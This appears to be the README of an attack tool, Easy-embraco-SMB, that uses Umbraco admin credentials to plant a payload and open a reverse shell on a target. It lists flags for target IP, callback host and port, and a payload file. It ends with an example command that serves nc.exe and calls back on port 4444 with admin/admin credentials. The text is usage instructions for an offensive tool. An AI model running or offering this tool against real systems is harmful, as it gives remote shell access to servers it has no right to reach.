# Easy-embraco-SMB

## Command line arguments
Easy-embraco-SMB.py [-h] --target TARGET --host HOST [--port PORT]
                           [--load LOAD] --user USER --passw PASSW

optional arguments:
  -h, --help            show this help message and exit
  --target TARGET, -t TARGET
                        Target IP address
  --host HOST, -x HOST  IP for reverse shell
  --port PORT, -p PORT  Port for reverse shell
  --load LOAD, -l LOAD  Path to file or script to provide to the public
  --user USER, -P USER  User name for Umbraco
  --passw PASSW, -U PASSW
                        Password for Umbraco


## Example usage
sudo python3 Easy-embraco-SMB.py --target 0.0.0.0 --host 0.0.0.0 --port 4444 --user admin@admin.com --pass admin --load ./nc.exe
